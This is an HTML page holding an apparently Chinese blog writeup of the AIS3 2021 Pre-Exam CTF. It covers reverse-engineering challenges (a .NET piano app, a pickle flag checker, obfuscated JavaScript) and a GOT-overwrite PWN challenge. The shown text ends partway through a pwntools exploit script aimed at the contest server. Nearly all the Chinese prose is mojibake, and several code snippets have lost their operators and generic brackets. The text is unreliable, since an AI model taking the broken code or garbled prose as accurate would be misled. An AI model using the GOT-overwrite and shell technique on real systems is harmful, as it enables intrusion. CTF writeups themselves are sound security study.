<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>AIS3 2021 Pre-Exam Writeup | Sloth-Blog</title><meta name=keywords content="CTF,AIS3"><meta name=description content="é›–ç„¶åªæœ‰è§£å‡ºæ¯å€‹é ˜åŸŸçš„ç°¡å–®é¡Œç›®
é‚„æ˜¯åšè‘—è‡‰çš®å¯«ä¸€ä¸‹Writeupå¥½äº†
åæ­£æŠ½æŸ¥ä¹Ÿè¢«æŠ½ä¸­äº†Q_Q
 REVERSE Piano é¡Œç›®æ˜¯ä¸€å€‹.NETçš„exeæª”ã€‚
æœ‰12å€‹éµçµ¦ä½ æŒ‰ã€è®“ä½ å½ˆé‹¼ç´ã€‚
  åªè¦æ˜¯.NETä¸€å¾‹ä¸Ÿé€²dnSpyåç·¨è­¯ã€‚
å…ˆä¾†çœ‹ä»–çš„click handlerï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è®“ä½ æŒ‰ä¸‹å»æ™‚æœƒæ”¾é‚£å€‹éŸ³éšçš„.wavæª”
ä½†æ˜¯è¼¸å…¥ç¬¬14å€‹éŸ³å¾Œæœ‰é»æœ‰è¶£ï¼Œæœƒè·‘ä¸€å€‹isValid()
å¦‚æœéäº†isValid()å°±æœƒè·³å‡ºä¸€å€‹è¦–çª—ï¼Œå…§å®¹æ˜¯nya()
å¯ä»¥è¯æƒ³åˆ°å¯èƒ½è¦æŒ‰ä¸‹14å€‹ç‰¹å®šçš„éŸ³
// piano.Piano // Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390 private void onClickHandler(object sender, EventArgs e) { Button button = (Button)sender; this.notes.Add(this.buttons.IndexOf(button)); this.audio.SoundLocation = Path.Combine(this.rootLocation, &#34;..\\Resources\\&#34; + button.Name + &#34;.wav&#34;); this.audio.Play(); if (this.notes.Count == 14) { if (this.isValid()) { MessageBox.Show(this.nya()); } this.notes.RemoveAt(0); } } å…ˆä¾†çœ‹nya()
å…§å®¹å¤šåŠå°±æ˜¯Flagäº†
å›å‚³å€¼æ˜¯listè£¡é¢çš„æ¯å€‹intå’Œæˆ‘å€‘æŒ‰ä¸‹çš„notesä¸€ç›´XORåˆ°åº•
// piano.Piano // Token: 0x06000004 RID: 4 RVA: 0x0000236C File Offset: 0x0000056C private string nya() { List<int> list = new List<int> { 70, 78, 89, 57, 112, 60, 125, 96, 103, 104, 50, 109, 87, 115, 112, 54, 100, 97, 103, 56, 85, 101, 56, 119, 119, 100, 59, 88, 50, 48, 62, 120, 84, 58, 100, 86, 74, 92, 54, 96, 60, 117, 119, 122 }; List<char> list2 = new List<char>(); for (int i = 0; i < list."><meta name=author content><link rel=canonical href=https://x2w-sloth.github.io/zh/posts/ais3_2021_pre_exam_writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.min.2d6dbfc6e0f8a1db1c9d082a76dc11d094328cf63f247bbc2421dfaa7f2bb170.css integrity="sha256-LW2/xuD4odscnQgqdtwR0JQyjPY/JHu8JCHfqn8rsXA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://x2w-sloth.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://x2w-sloth.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://x2w-sloth.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://x2w-sloth.github.io/apple-touch-icon.png><link rel=mask-icon href=https://x2w-sloth.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.83.1"><link rel=alternate hreflang=zh href=https://x2w-sloth.github.io/zh/posts/ais3_2021_pre_exam_writeup/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-197567679-1','auto'),ga('send','pageview'))</script><meta property="og:title" content="AIS3 2021 Pre-Exam Writeup"><meta property="og:description" content="é›–ç„¶åªæœ‰è§£å‡ºæ¯å€‹é ˜åŸŸçš„ç°¡å–®é¡Œç›®
é‚„æ˜¯åšè‘—è‡‰çš®å¯«ä¸€ä¸‹Writeupå¥½äº†
åæ­£æŠ½æŸ¥ä¹Ÿè¢«æŠ½ä¸­äº†Q_Q
 REVERSE Piano é¡Œç›®æ˜¯ä¸€å€‹.NETçš„exeæª”ã€‚
æœ‰12å€‹éµçµ¦ä½ æŒ‰ã€è®“ä½ å½ˆé‹¼ç´ã€‚
  åªè¦æ˜¯.NETä¸€å¾‹ä¸Ÿé€²dnSpyåç·¨è­¯ã€‚
å…ˆä¾†çœ‹ä»–çš„click handlerï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è®“ä½ æŒ‰ä¸‹å»æ™‚æœƒæ”¾é‚£å€‹éŸ³éšçš„.wavæª”
ä½†æ˜¯è¼¸å…¥ç¬¬14å€‹éŸ³å¾Œæœ‰é»æœ‰è¶£ï¼Œæœƒè·‘ä¸€å€‹isValid()
å¦‚æœéäº†isValid()å°±æœƒè·³å‡ºä¸€å€‹è¦–çª—ï¼Œå…§å®¹æ˜¯nya()
å¯ä»¥è¯æƒ³åˆ°å¯èƒ½è¦æŒ‰ä¸‹14å€‹ç‰¹å®šçš„éŸ³
// piano.Piano // Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390 private void onClickHandler(object sender, EventArgs e) { Button button = (Button)sender; this.notes.Add(this.buttons.IndexOf(button)); this.audio.SoundLocation = Path.Combine(this.rootLocation, &#34;..\\Resources\\&#34; + button.Name + &#34;.wav&#34;); this.audio.Play(); if (this.notes.Count == 14) { if (this.isValid()) { MessageBox.Show(this.nya()); } this.notes.RemoveAt(0); } } å…ˆä¾†çœ‹nya()
å…§å®¹å¤šåŠå°±æ˜¯Flagäº†
å›å‚³å€¼æ˜¯listè£¡é¢çš„æ¯å€‹intå’Œæˆ‘å€‘æŒ‰ä¸‹çš„notesä¸€ç›´XORåˆ°åº•
// piano.Piano // Token: 0x06000004 RID: 4 RVA: 0x0000236C File Offset: 0x0000056C private string nya() { List<int> list = new List<int> { 70, 78, 89, 57, 112, 60, 125, 96, 103, 104, 50, 109, 87, 115, 112, 54, 100, 97, 103, 56, 85, 101, 56, 119, 119, 100, 59, 88, 50, 48, 62, 120, 84, 58, 100, 86, 74, 92, 54, 96, 60, 117, 119, 122 }; List<char> list2 = new List<char>(); for (int i = 0; i < list."><meta property="og:type" content="article"><meta property="og:url" content="https://x2w-sloth.github.io/zh/posts/ais3_2021_pre_exam_writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-05-25T17:23:15+08:00"><meta property="article:modified_time" content="2021-05-25T17:23:15+08:00"><meta property="og:site_name" content="Sloth-Blog"><meta name=twitter:card content="summary"><meta name=twitter:title content="AIS3 2021 Pre-Exam Writeup"><meta name=twitter:description content="é›–ç„¶åªæœ‰è§£å‡ºæ¯å€‹é ˜åŸŸçš„ç°¡å–®é¡Œç›®
é‚„æ˜¯åšè‘—è‡‰çš®å¯«ä¸€ä¸‹Writeupå¥½äº†
åæ­£æŠ½æŸ¥ä¹Ÿè¢«æŠ½ä¸­äº†Q_Q
 REVERSE Piano é¡Œç›®æ˜¯ä¸€å€‹.NETçš„exeæª”ã€‚
æœ‰12å€‹éµçµ¦ä½ æŒ‰ã€è®“ä½ å½ˆé‹¼ç´ã€‚
  åªè¦æ˜¯.NETä¸€å¾‹ä¸Ÿé€²dnSpyåç·¨è­¯ã€‚
å…ˆä¾†çœ‹ä»–çš„click handlerï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è®“ä½ æŒ‰ä¸‹å»æ™‚æœƒæ”¾é‚£å€‹éŸ³éšçš„.wavæª”
ä½†æ˜¯è¼¸å…¥ç¬¬14å€‹éŸ³å¾Œæœ‰é»æœ‰è¶£ï¼Œæœƒè·‘ä¸€å€‹isValid()
å¦‚æœéäº†isValid()å°±æœƒè·³å‡ºä¸€å€‹è¦–çª—ï¼Œå…§å®¹æ˜¯nya()
å¯ä»¥è¯æƒ³åˆ°å¯èƒ½è¦æŒ‰ä¸‹14å€‹ç‰¹å®šçš„éŸ³
// piano.Piano // Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390 private void onClickHandler(object sender, EventArgs e) { Button button = (Button)sender; this.notes.Add(this.buttons.IndexOf(button)); this.audio.SoundLocation = Path.Combine(this.rootLocation, &#34;..\\Resources\\&#34; + button.Name + &#34;.wav&#34;); this.audio.Play(); if (this.notes.Count == 14) { if (this.isValid()) { MessageBox.Show(this.nya()); } this.notes.RemoveAt(0); } } å…ˆä¾†çœ‹nya()
å…§å®¹å¤šåŠå°±æ˜¯Flagäº†
å›å‚³å€¼æ˜¯listè£¡é¢çš„æ¯å€‹intå’Œæˆ‘å€‘æŒ‰ä¸‹çš„notesä¸€ç›´XORåˆ°åº•
// piano.Piano // Token: 0x06000004 RID: 4 RVA: 0x0000236C File Offset: 0x0000056C private string nya() { List<int> list = new List<int> { 70, 78, 89, 57, 112, 60, 125, 96, 103, 104, 50, 109, 87, 115, 112, 54, 100, 97, 103, 56, 85, 101, 56, 119, 119, 100, 59, 88, 50, 48, 62, 120, 84, 58, 100, 86, 74, 92, 54, 96, 60, 117, 119, 122 }; List<char> list2 = new List<char>(); for (int i = 0; i < list."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://x2w-sloth.github.io/zh/posts/"},{"@type":"ListItem","position":2,"name":"AIS3 2021 Pre-Exam Writeup","item":"https://x2w-sloth.github.io/zh/posts/ais3_2021_pre_exam_writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"AIS3 2021 Pre-Exam Writeup","name":"AIS3 2021 Pre-Exam Writeup","description":"é›–ç„¶åªæœ‰è§£å‡ºæ¯å€‹é ˜åŸŸçš„ç°¡å–®é¡Œç›®\né‚„æ˜¯åšè‘—è‡‰çš®å¯«ä¸€ä¸‹Writeupå¥½äº†\nåæ­£æŠ½æŸ¥ä¹Ÿè¢«æŠ½ä¸­äº†Q_Q\n REVERSE Piano é¡Œç›®æ˜¯ä¸€å€‹.NETçš„exeæª”ã€‚\næœ‰12å€‹éµçµ¦ä½ æŒ‰ã€è®“ä½ å½ˆé‹¼ç´ã€‚\n  åªè¦æ˜¯.NETä¸€å¾‹ä¸Ÿé€²dnSpyåç·¨è­¯ã€‚\nå…ˆä¾†çœ‹ä»–çš„click handlerï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è®“ä½ æŒ‰ä¸‹å»æ™‚æœƒæ”¾é‚£å€‹éŸ³éšçš„.wavæª”\nä½†æ˜¯è¼¸å…¥ç¬¬14å€‹éŸ³å¾Œæœ‰é»æœ‰è¶£ï¼Œæœƒè·‘ä¸€å€‹isValid()\nå¦‚æœéäº†isValid()å°±æœƒè·³å‡ºä¸€å€‹è¦–çª—ï¼Œå…§å®¹æ˜¯nya()\nå¯ä»¥è¯æƒ³åˆ°å¯èƒ½è¦æŒ‰ä¸‹14å€‹ç‰¹å®šçš„éŸ³\n// piano.Piano // Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390 private void onClickHandler(object sender, EventArgs e) { Button button = (Button)sender; this.notes.Add(this.buttons.IndexOf(button)); this.audio.SoundLocation = Path.Combine(this.rootLocation, \u0026#34;..\\\\Resources\\\\\u0026#34; + button.Name + \u0026#34;.wav\u0026#34;); this.audio.Play(); if (this.notes.Count == 14) { if (this.isValid()) { MessageBox.Show(this.nya()); } this.notes.RemoveAt(0); } } å…ˆä¾†çœ‹nya()\nå…§å®¹å¤šåŠå°±æ˜¯Flagäº†\nå›å‚³å€¼æ˜¯listè£¡é¢çš„æ¯å€‹intå’Œæˆ‘å€‘æŒ‰ä¸‹çš„notesä¸€ç›´XORåˆ°åº•\n// piano.Piano // Token: 0x06000004 RID: 4 RVA: 0x0000236C File Offset: 0x0000056C private string nya() { List\u0026lt;int\u0026gt; list = new List\u0026lt;int\u0026gt; { 70, 78, 89, 57, 112, 60, 125, 96, 103, 104, 50, 109, 87, 115, 112, 54, 100, 97, 103, 56, 85, 101, 56, 119, 119, 100, 59, 88, 50, 48, 62, 120, 84, 58, 100, 86, 74, 92, 54, 96, 60, 117, 119, 122 }; List\u0026lt;char\u0026gt; list2 = new List\u0026lt;char\u0026gt;(); for (int i = 0; i \u0026lt; list.","keywords":["CTF","AIS3"],"articleBody":"é›–ç„¶åªæœ‰è§£å‡ºæ¯å€‹é ˜åŸŸçš„ç°¡å–®é¡Œç›®\né‚„æ˜¯åšè‘—è‡‰çš®å¯«ä¸€ä¸‹Writeupå¥½äº†\nåæ­£æŠ½æŸ¥ä¹Ÿè¢«æŠ½ä¸­äº†Q_Q\n REVERSE Piano é¡Œç›®æ˜¯ä¸€å€‹.NETçš„exeæª”ã€‚\næœ‰12å€‹éµçµ¦ä½ æŒ‰ã€è®“ä½ å½ˆé‹¼ç´ã€‚\n  åªè¦æ˜¯.NETä¸€å¾‹ä¸Ÿé€²dnSpyåç·¨è­¯ã€‚\nå…ˆä¾†çœ‹ä»–çš„click handlerï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è®“ä½ æŒ‰ä¸‹å»æ™‚æœƒæ”¾é‚£å€‹éŸ³éšçš„.wavæª”\nä½†æ˜¯è¼¸å…¥ç¬¬14å€‹éŸ³å¾Œæœ‰é»æœ‰è¶£ï¼Œæœƒè·‘ä¸€å€‹isValid()\nå¦‚æœéäº†isValid()å°±æœƒè·³å‡ºä¸€å€‹è¦–çª—ï¼Œå…§å®¹æ˜¯nya()\nå¯ä»¥è¯æƒ³åˆ°å¯èƒ½è¦æŒ‰ä¸‹14å€‹ç‰¹å®šçš„éŸ³\n// piano.Piano // Token: 0x06000002 RID: 2 RVA: 0x00002190 File Offset: 0x00000390 private void onClickHandler(object sender, EventArgs e) { Button button = (Button)sender; this.notes.Add(this.buttons.IndexOf(button)); this.audio.SoundLocation = Path.Combine(this.rootLocation, \"..\\\\Resources\\\\\" + button.Name + \".wav\"); this.audio.Play(); if (this.notes.Count == 14) { if (this.isValid()) { MessageBox.Show(this.nya()); } this.notes.RemoveAt(0); } } å…ˆä¾†çœ‹nya()\nå…§å®¹å¤šåŠå°±æ˜¯Flagäº†\nå›å‚³å€¼æ˜¯listè£¡é¢çš„æ¯å€‹intå’Œæˆ‘å€‘æŒ‰ä¸‹çš„notesä¸€ç›´XORåˆ°åº•\n// piano.Piano // Token: 0x06000004 RID: 4 RVA: 0x0000236C File Offset: 0x0000056C private string nya() { Listint list = new Listint { 70, 78, 89, 57, 112, 60, 125, 96, 103, 104, 50, 109, 87, 115, 112, 54, 100, 97, 103, 56, 85, 101, 56, 119, 119, 100, 59, 88, 50, 48, 62, 120, 84, 58, 100, 86, 74, 92, 54, 96, 60, 117, 119, 122 }; Listchar list2 = new Listchar(); for (int i = 0; i char)(list[i] ^ this.notes[i % this.notes.Count])); } return new string(list2.ToArray()); } ä½†æ˜¯å› ç‚ºè§£å‡ºä¾†çš„å­—ä¸²å’Œæˆ‘å€‘æŒ‰ä¸‹çš„notesç›´æ¥ç›¸é—œï¼Œ\nä¸èƒ½ç›´æ¥patchåˆ¤æ–·validåœ°æ–¹ï¼Œéœ€è¦ç¢ºå®šé€™14å€‹éŸ³åˆ°åº•æ˜¯ä»€éº¼\nå†ä¾†çœ‹ä¸€ä¸‹isValid()\nå·²ç¶“çµ¦å‡ºç¬¬iå€‹éŸ³å’Œç¬¬(i+1) % 14å€‹éŸ³ä¹‹é–“çš„é—œä¿‚\n// piano.Piano // Token: 0x06000003 RID: 3 RVA: 0x00002220 File Offset: 0x00000420 private bool isValid() { Listint list = new Listint { 14, 17, 20, 21, 22, 21, 19, 18, 12, 6, 11, 16, 15, 14 }; Listint list2 = new Listint { 0, -3, 0, -1, 0, 1, 1, 0, 6, 0, -5, 0, 1, 0 }; for (int i = 0; i 14; i++) { if (this.notes[i] + this.notes[(i + 1) % 14] != list[i]) { return false; } if (this.notes[i] - this.notes[(i + 1) % 14] != list2[i]) { return false; } } return true; } è§£å®Œè¯ç«‹å¾Œç™¼ç¾é€™14å€‹éŸ³æ˜¯\nC#, C#, G#, G#, A#, A#, G#, F#, F#, F, F, D#, D#, C#\nå½ˆå®Œå°æ˜Ÿæ˜Ÿä¹‹å¾Œå°±è·³å‡ºä¸€å€‹è¦–çª—çµ¦ä½ Flagäº†\nAIS3{7wink1e_tw1nkl3_l1ttl3_574r_1n_C_5h4rp}\n ğŸ°PeekorağŸ¥’ é¡Œç›®æ˜¯ä¸€å€‹Python Pickleæª”ï¼šflag_checker.pkl\nå¯ä»¥ç”¨ python -m pickle flag_checker.pkl åŸ·è¡Œå®ƒ\nä¸¦ä¸”å¦‚åå­—æ‰€ç¤º, æˆåŠŸè¼¸å…¥flagå°±æœƒprint(â€œCorrect!\")\nè¼¸å…¥éŒ¯èª¤çš„è©±æœƒç›´æ¥exit, ä¸è®“ä½ ç”¨pickleæŠŠå®ƒloadå®Œã€‚\nåªèƒ½ä¹–ä¹–åšéœæ…‹åˆ†æäº†\npython -m pickletools -a flag_checker.pkl\n0: c GLOBAL '__builtin__ input' Push a global object (module.attr) on the stack. 19: ( MARK Push markobject onto the stack. 20: S STRING 'FLAG: ' Push a Python string object. 30: t TUPLE (MARK at 19) Build a tuple out of the topmost stack slice, after markobject. 31: R REDUCE Push an object built from a callable and an argument tuple. 32: p PUT 0 Store the stack top into the memo. The stack is not popped. 35: 0 POP Discard the top stack item, shrinking the stack by one item. 36: c GLOBAL '__builtin__ getattr' Push a global object (module.attr) on the stack. 57: p PUT 1 Store the stack top into the memo. The stack is not popped. 60: 0 POP Discard the top stack item, shrinking the stack by one item. 61: g GET 1 Read an object from the memo and push it on the stack. 64: ( MARK Push markobject onto the stack. 65: ( MARK Push markobject onto the stack. 66: c GLOBAL '__builtin__ exit' Push a global object (module.attr) on the stack. 84: c GLOBAL '__builtin__ str' Push a global object (module.attr) on the stack. 101: l LIST (MARK at 65) Build a list out of the topmost stack slice, after markobject. 102: S STRING '__getitem__' Push a Python string object. 117: t TUPLE (MARK at 64) Build a tuple out of the topmost stack slice, after markobject. 118: R REDUCE Push an object built from a callable and an argument tuple. 119: p PUT 2 Store the stack top into the memo. The stack is not popped. 122: 0 POP Discard the top stack item, shrinking the stack by one item. 123: g GET 2 Read an object from the memo and push it on the stack. 126: ( MARK Push markobject onto the stack. 127: g GET 1 Read an object from the memo and push it on the stack. 130: ( MARK Push markobject onto the stack. 131: g GET 0 Read an object from the memo and push it on the stack. 134: S STRING 'startswith' Push a Python string object. 148: t TUPLE (MARK at 130) Build a tuple out of the topmost stack slice, after markobject. 149: R REDUCE Push an object built from a callable and an argument tuple. 150: ( MARK Push markobject onto the stack. 151: S STRING 'AIS3{' Push a Python string object. 160: t TUPLE (MARK at 150) Build a tuple out of the topmost stack slice, after markobject. 161: R REDUCE Push an object built from a callable and an argument tuple. 162: t TUPLE (MARK at 126) Build a tuple out of the topmost stack slice, after markobject. 163: R REDUCE Push an object built from a callable and an argument tuple. # ä»¥ä¸‹ç•¥... æ²’ä»€éº¼å¥½èªªçš„ï¼Œå°±æ˜¯å¤§éƒ¨åˆ†ç›´è­¯èªè¨€åŸ·è¡ŒæœŸçš„æ¶æ§‹ï¼Œç”¨stackå‘¼å«å‡½æ•¸\npickletools æœ‰å¹«å¿™æŠŠæ®µè½indentçœŸçš„æ˜¯å¹«äº†å¤§å¿™ã€‚\næ¥ä¸‹ä¾†å°±è¦ä½¿ç”¨è¶…å‡¡çš„æ„å¿—åŠ›ç›¯è‘—å®ƒçœ‹ï¼Œ\nç„¶å¾Œæ‚Ÿå‡ºflagæœƒç¶“éä»¥ä¸‹çš„testï¼š\n flag.startswith(â€˜AIS3{') flag.endswith('}') flag[6] == â€˜Aâ€™ flag[9] == â€˜jâ€™ flag[11] == â€˜pâ€™ flag[14] == flag[9] flag[5] == â€™dâ€™ flag[10] == â€˜zâ€™ flag[12] == â€˜hâ€™ flag[13] == flag[1] flag[8] == â€˜wâ€™ flag[7] == â€™m'  æ‰€ä»¥æœ€å¾Œæ‹¼å‡ºä¾†çš„flagæ˜¯\nAIS3{dAmwjzphIj}\n Colors é¡Œç›®é€£çµæ˜¯é€™å€‹ç¶²é ï¼Œé¦¬ä¸Šæœ‰ä¸å¥½çš„é æ„Ÿæœƒæ˜¯Reverse JSé¡Œ\n  å‰10å€‹å­—æ¯çš„htmlé•·é€™æ¨£(å¾ˆé‡è¦ï¼Œç­‰ä¸€ä¸‹æœƒè€ƒ)\nspandiv class=\"c0 r0\"idivspan spandiv class=\"c0 r0\"ndivspan spandiv class=\"c0 r0\"pdivspan spandiv class=\"c0 r0\"udivspan spandiv class=\"c0 r0\"tdivspan spandiv class=\"c1 r0\"sdivspan spandiv class=\"c1 r0\"edivspan spandiv class=\"c1 r0\"cdivspan spandiv class=\"c1 r0\"rdivspan spandiv class=\"c1 r0\"edivspan spandiv class=\"c1 r0\"tdivspan ç„¶å¾Œé¡Œç›®çš„Javascriptæœ‰åšobfuscationï¼Œæ‰€ä»¥çœŸçš„æœ‰å¤ é†œã€‚\nç¶“éä¸€äº›ç°¡åŒ–ä»¥åŠé‡æ–°å‘½åå¾Œï¼Œæœ‰é—œsecret codeçš„é‚è¼¯ï¼š\ndocument['addEventListener']('keydown', LISTENER={ const _0x12b963 = f2; if (LISTENER['key'] === 'Backspace' \u0026\u0026 SEQ == 0xa) _0x1e21d9['textContent'] = _0x1e21d9['textContent']['substr'](0x0, _0x1e21d9['textContent']['length'] - 0x1); else { if (LISTENER['key'] === 'ArrowUp' \u0026\u0026 !(SEQ  0x1)) return SEQ += 0x1; else { if (LISTENER['key'] === 'ArrowDown' \u0026\u0026 !(SEQ  0x2)) return SEQ += 0x1; else { if (LISTENER['key'] === 'ArrowLeft' \u0026\u0026 (SEQ == 0x4 || SEQ == 0x6)) return SEQ += 0x1; else { if (LISTENER['key'] === 'ArrowRight' \u0026\u0026 (SEQ == 0x5 || SEQ == 0x7)) return SEQ += 0x1; else { if (LISTENER['key'] === 'b' \u0026\u0026 SEQ == 0x8) return SEQ += 0x1; else { if (LISTENER['key'] === 'a' \u0026\u0026 SEQ == 0x9) return document['getElementsByTagName']('body')[0x0]['innerHTML'] += atob(b1), _0x1e21d9 = document['getElementById']('input'), _0x1e21d9['innerHTML'] = '', // unlock input  document['getElementById']('output')['innerHTML'] = atob(b2)['match'](/(.{1,3})/g)['map'](_0x5efa9e=TAG(_0x5efa9e[0x0], _0x5efa9e[0x1], _0x5efa9e[0x2]))['join'](''), SEQ += 0x1; else { if (LISTENER['key']['length'] == 0x1 \u0026\u0026 SEQ == 0xa) _0x1e21d9['textContent'] += String['fromCharCode'](LISTENER['key']['charCodeAt']()); else return; } } } } } } } update(_0x1e21d9['textContent']); } åŸºæœ¬ä¸Šå°±æ˜¯å¾EventListeneræŠ“ä½ è¼¸å…¥çš„åå€‹key\nå¯ä»¥çœ‹å‡ºsecret codeæ˜¯ â†‘â†‘â†“â†“â†â†’â†â†’ba\nè¼¸å…¥secret codeå¾Œé‚„ä¸æ”¾éä½ ï¼š\n  æ¥ä¸‹ä¾†æˆ‘å€‘å¯ä»¥è¼¸å…¥ä»»æ„å­—ä¸²ï¼Œç¶²ç«™æœƒçµ¦æˆ‘å€‘çœ‹encodeå¾Œçš„çµæœ\nå¯«å‡ºdecoderå¾Œæ‡‰è©²å°±èƒ½é‚„åŸflagäº†\nå…ˆä¾†çœ‹çœ‹ä»–çš„encodingé‚è¼¯ï¼š\nlet TAG = (cid,rid,chr)=' + cid + '\\x20r' + rid + '\\x22' + chr + ''; let b64 = \"AlS3{BasE64_i5+b0rNIng~\\\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}\"; function encode(INPUT) { const _0x9fe181 = f2; if (!INPUT['length']) return ''; let BIN = '' , result = '' , rest = 0x0; for (let i = 0x0; i  INPUT['length']; i++) // appends ASCII bin string for each char in input  BIN += INPUT['charCodeAt'](i)['toString'](0x2)['padStart'](0x8, '0'); rest = BIN['length'] % ten / 0x2 - 0x1; if (rest != -0x1) // pad the bin string to a multiple of ten  BIN += '0'['repeat'](ten - BIN['length'] % ten); // split into sections of 10 bits  BIN = BIN['match'](/(.{1,10})/g); for (let section of BIN) { // x from 0 to 1023  let x = parseInt(section, 0x2); // bit 6 to 8 bit determines color \t// bit 9 determines ??? \t// bit 0 to 5 determines char  result += TAG(x  0x6 \u0026 0x7, x  0x9, b64[x \u0026 0x3f]); } for (; rest  0x0; rest--) { result += TAG(rest % eight, 0x0, '='); } return result; } æ¯äº”å€‹å­—å…ƒæœƒæŠŠAsciiå»¶ä¼¸åˆ°8-bitä¹‹å¾Œå†æ¥èµ·ä¾†ï¼Œé€™æ¨£æ˜¯ä¸€åœ˜40-bitçš„è³‡è¨Š\nç„¶å¾Œä»¥10-bitç‚ºä¸€å–®ä½ç·¨ç¢¼æˆå››å€‹å­—å…ƒ\n10-bitçš„ç”¨æ³•æ˜¯ï¼š\n bit 0-5 å¾64å€‹å­—å…ƒé¸ä¸€ç¨® bit 6-8 å¾8ç¨®é¡è‰²é¸ä¸€ç¨® bit 9 ä¸çŸ¥é“åœ¨å¹¹éº»æˆ‘ä¹Ÿæ‡¶çš„å¼„æ¸…æ¥š  æ¥ä¸‹ä¾†å°±æ˜¯æŠŠencoded flagçš„è³‡è¨ŠæŠ“ä¸‹ä¾†ç„¶å¾Œå¯«decoderï¼š\nenc = [ \"04B\", \"02g\", \"03i\", \"15J\", // 40 bits of data \t\"066\", \"10\\\\\", \"03w\", \"041\", \"03A\", \"14j\", \"04\\\\\", \"141\", \"03g\", \"07u\", \"03i\", \"01k\", \"03l\", \"047\", \"06x\", \"05i\", \"05X\", \"01K\", \"01I\", \"04h\", \"05X\", \"00K\", \"14i\", \"15l\", \"076\", \"07f\", \"04o\", \"016\", \"055\", \"07K\", \"11n\", \"158\", \"077\", \"14B\", \"05-\", \"118\", \"04w\", \"13a\", \"01r\", \"14z\", \"07K\", \"03=\", \"02=\", \"01=\", ]; b64 = \"AlS3{BasE64_i5+b0rNIng~\\\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}\" // 64 chars flag = '' for (var seg = 0; seg  enc.length; seg+=4) { bits = '' for (var i = 0; i  4; i++) { bits += enc[seg + i][0]; bits += (parseInt(enc[seg + i][1])0).toString(2).padStart(3, '0'); bits += (b64.indexOf(enc[seg + i][2])0).toString(2).padStart(6, '0'); } bits = bits.match(/.{1,8}/g); for (var i = 0; i  5; i++) flag += String.fromCharCode(parseInt(bits[i], 2)) } console.log(flag); å¾ˆå¤šäºº(æˆ‘ä¹Ÿæœ‰ä»½)ä¸€é–‹å§‹ä¸Šå‚³\nAlS3{BasE64_i5+b0rNIng~\\\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}\nä¸€ç›´åˆ°å®˜æ–¹å‡ºä¾†æ¾„æ¸…é€™ä¸æ˜¯Flagåˆ¥å†å‚³äº†â€¦\nç„¶å¾Œå¯«å®Œæ‰æƒ³åˆ°å…¶å¯¦decoderç”¨Pythonå¯«å°±å¥½äº†ï¼Œå¹¹éº»ç¹¼çºŒå¯«JSæŠ˜ç£¨è‡ªå·± XD\nAIS3{base1024_15_c0l0RFuL_GAM3_CL3Ar_thIS_IS_y0Ur_FlaG!}\n PWN Write Me é¡Œç›®æœ‰çµ¦Source\nåŸºæœ¬ä¸Šå°±æ˜¯è®“ä½ å¯«8-byteåˆ°ä»»æ„åœ°æ–¹\nåªæ˜¯å› ç‚ºsystem@gotè¢«å¯«0ï¼Œæœ€å¾Œçš„system(\"/bin/sh\");è·‘ä¸å‡ºä¾†\n#include #include int main() { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); void *systemgot = 0x404028; void *scanfgot = 0x404040; *(long long *)systemgot = (long long)0x0; printf(\"Address: \"); void *addr; long long v; scanf(\"%ld\",\u0026addr); printf(\"Value: \"); scanf(\"%ld\",\u0026v); *(long long *)addr = (long long)v; *(long long *)scanfgot = (long long)0x0; printf(\"OK! Shell for you :)\\n\"); system(\"/bin/sh\"); return 0; } binaryçš„åå­—å«åšgotplt\nchecksec çš„çµæœæ˜¯Partial Relocation + No PIE\nä¹Ÿå°±æ˜¯é€™å€‹ELFè£¡é¢çš„offsetåœ¨æ¯æ¬¡åŸ·è¡Œéƒ½ä¸€æ¨£ï¼Œè€Œä¸”GOT tableå¯å¯«\næ‰€ä»¥æŠŠsystem@gotçš„ä½å€é‚„åŸå°±å¯ä»¥é †åˆ©è·‘system(\"/bin/sh\")äº†\nå› ç‚ºæ˜¯ç”¨scanf(\"%ld\")ï¼Œæ‰€ä»¥è¦è¨˜å¾—æŠŠä½å€è½‰åé€²ä½å†è¼¸å…¥\n#!/usr/bin/env python3 from pwn import * context.arch = 'amd64' context.log_level = 'info' binary = context.binary = ELF('./gotplt') if args.REMOTE: p = remote('quiz.ais3.org', 10102) 